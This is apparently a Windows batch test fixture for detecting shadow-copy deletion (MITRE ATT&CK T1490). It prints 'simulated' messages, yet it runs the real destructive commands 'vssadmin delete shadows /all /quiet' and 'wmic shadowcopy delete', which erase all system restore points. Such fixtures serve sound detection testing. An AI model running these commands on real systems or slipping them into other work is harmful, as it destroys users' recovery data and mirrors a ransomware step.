@echo off
REM [DETECTION TEST FIXTURE: Shadow Copy Deletion Indicator]
REM MITRE ATT&CK: T1490 (Inhibit System Recovery)
echo [TEST] Executing simulated system recovery inhibition pattern...
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
echo [TEST] Command sequence completed.
